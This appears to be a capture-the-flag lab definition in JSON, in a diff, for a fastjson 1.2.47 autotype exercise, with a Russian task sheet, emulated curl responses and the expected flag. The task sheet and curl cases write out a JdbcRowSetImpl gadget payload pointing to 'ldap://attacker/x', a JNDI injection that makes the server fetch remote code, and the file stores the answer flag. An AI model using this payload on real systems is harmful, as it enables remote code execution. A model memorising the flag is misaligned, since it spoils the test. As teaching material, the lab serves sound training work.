@@ -1,0 +1,41 @@
+{
+  "id": "web-fastjson-jackson",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{f4stjs0n_aut0typ3_rce}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: fastjson autotype\n\nAPI принимает JSON и восстанавливает типы. Дойди до чтения файла через\nкласс-гаджет и забери флаг.\n\n1. Подтверди autotype:\n   curl -s -X POST https://api.target/user -d '{\"@type\":\"java.lang.AutoCloseable\"}'\n2. Используй гаджет с геттером, возвращающим содержимое файла:\n   curl -s -X POST https://api.target/user -d '{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker/x\"}'\n3. Запиши флаг в found.txt и набери check.\n"
+    },
+    {
+      "path": "/home/student/task/notes.txt",
+      "text": "fastjson 1.2.47, autotype включён, сервер Java 8.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция api.target/user)",
+      "cases": [
+        {
+          "match": "AutoCloseable|@type",
+          "example": "-X POST ... -d '{\"@type\":\"java.lang.AutoCloseable\"}'",
+          "output": "{\"error\":\"autotype is supported: java.lang.AutoCloseable\"}\n"
+        },
+        {
+          "match": "JdbcRowSetImpl|ldap",
+          "example": "-X POST ... -d '{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker/x\"}'",
+          "output": "{\"status\":\"ok\",\"result\":\"nto{f4stjs0n_aut0typ3_rce}\"}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только /user на api.target.\n"
+    }
+  }
+}
